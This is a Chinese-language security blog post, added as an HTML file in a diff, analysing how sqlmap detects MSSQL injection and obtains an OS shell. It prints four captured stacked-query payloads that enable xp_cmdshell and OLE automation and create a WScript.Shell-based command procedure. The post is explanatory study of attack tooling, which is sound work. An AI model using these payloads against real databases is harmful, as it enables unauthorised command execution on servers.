@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>老生常谈之Mssql注入 | chriskali&#39;s blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://chriskalix.github.io/favicon.ico?v=1597631303791">
+<link rel="stylesheet" href="https://chriskalix.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+注入，老话题了。但是实战中碰到时往往草草带过，稍一深入就要露馅了，基本功不扎实不行，趁热打铁，立刻补上
+
+环境
+
+环境的安装是比较头疼的，也没啥好说的，直接搜索搭建就完事了
+
+sqlserver 2014
+win10
+php5.2.17
+..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://chriskalix.github.io">
+        <img src="https://chriskalix.github.io/images/avatar.png?v=1597631303791" class="site-logo">
+        <h1 class="site-title">chriskali&#39;s blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      Keep learning
+    </div>
+    <div class="site-footer">
+      chriskalix | <a class="rss" href="https://chriskalix.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">老生常谈之Mssql注入</h2>
+            <div class="post-date">2020-08-15</div>
+            
+            <div class="post-content" v-pre>
+              <blockquote>
+<p>注入，老话题了。但是实战中碰到时往往草草带过，稍一深入就要露馅了，基本功不扎实不行，趁热打铁，立刻补上</p>
+</blockquote>
+<h2 id="环境">环境</h2>
+<blockquote>
+<p>环境的安装是比较头疼的，也没啥好说的，直接搜索搭建就完事了</p>
+</blockquote>
+<p>sqlserver 2014<br>
+win10<br>
+php5.2.17</p>
+<h2 id="sqlmap行为分析">SQLmap行为分析</h2>
+<blockquote>
+<p>这里使用的方法是sqlmap，然后流量代理至本地burpsuite进行流量分析</p>
+</blockquote>
+<h3 id="普通判断">普通判断</h3>
+<p>首先，SQLmap会预先判断数据库，当判断完毕后，需要选择<br>
+<img src="https://chriskalix.github.io/post-images/1597507430917.png" alt="" loading="lazy"><br>
+这时候看一下sqlmap发了什么数据。首先总共发送了6个数据包，因为之前预先读过一小部分的sqlmap源码，但是由于实在是太大（我太懒），所以用半猜测半推断的方式进行分析<br>
+<img src="https://chriskalix.github.io/post-images/1597507581479.png" alt="" loading="lazy"><br>
+首先会发送一个预先判断的数据包，应该是判断是否存在WAF<br>
+<img src="https://chriskalix.github.io/post-images/1597507626390.png" alt="" loading="lazy"><br>
+之后通过两个数据包，猜测通过判断返回包的关键字判断了为mssql，之后的数据包太多了，我还是口述一下。默认的technique是全部的BEUSTQ，在尝试了所有注入类型后，Sqlmap给出结果。<br>
+<img src="https://chriskalix.github.io/post-images/1597507917353.png" alt="" loading="lazy"><br>
+即报错型，时间布尔型，堆叠注入都可以</p>
+<h3 id="关键的os-shell">关键的OS-shell</h3>
+<blockquote>
+<p>SQLmap中Os-shell的方式，之前在mysql中已经做过了解。先知中的<a href="https://xz.aliyun.com/t/7942">这篇文章</a>没有提到sqlserver怎么从注入点os-shell的，一时尴尬的我不知如何是好...</p>
+</blockquote>
+<p>首先，先发了4个包，剔除探活的就是3个<br>
+<img src="https://chriskalix.github.io/post-images/1597508231666.png" alt="" loading="lazy"><br>
+前面两个应该为报错型的数据，所以直接看最后的一个数据包<br>
+<img src="https://chriskalix.github.io/post-images/1597508739304.png" alt="" loading="lazy"><br>
+在返回中提示了xp_cmdshell插件没有开启，同时sqlmap也提示是否要重新启用该组件，之后的payload为如下所示，共有四个（剔除了校验xp_cmdshell是否开启的数据包）<br>
+包1，尝试直接开启xp_cmdshell，失败（语法错误</p>
+<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE-- HTTP/1.1
+</code></pre>
+<p>包2，把xp_cmdshell关了</p>
+<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',0; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE--
+</code></pre>
+<p>包3，启用<code>ole automation procedures</code>，语法错误</p>
+<pre><code>test');EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'ole automation procedures',1; RECONFIGURE WITH OVERRIDE--
+</code></pre>
+<p>包4，用sp_OACreate创建xp_cmdshell</p>
+<pre><code>test');DECLARE @hpzy nvarchar(999); SET @hpzy='CREATE PROCEDURE new_xp_cmdshell(@cmd varchar(255)) AS DECLARE @ID int EXEC sp_OACreate ''WScript.Shell'',@ID OUT EXEC sp_OAMethod @ID,''Run'',Null,@cmd,0,1 EXEC sp_OADestroy @ID'; EXEC master..sp_executesql @hpzy;RECONFIGURE WITH OVERRIDE--
+</code></pre>
+<p>上面一顿操作后，os-shell的结果是失败的（使用的是Error-based注入，那么time-based是否不一样呢？答：其实也是用xp_cmdshell，只是time-based建立了一个临时表，然后把xp_cmdshell的结果写道临时表里面，再读取出来。为什么出错了呢？猜测因为代码写的是query。<br>
+这里刚开始看的时候比较好奇，都已经sp_OAcreate了，为什么不直接执行命令就行了呢？后来发现这样执行其实是没有回显的......</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://chriskalix.github.io/post/8IizO54vS/">
+                  <h3 class="post-title">
+                    dedecms老洞分析之 - CVE-2018-7700
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
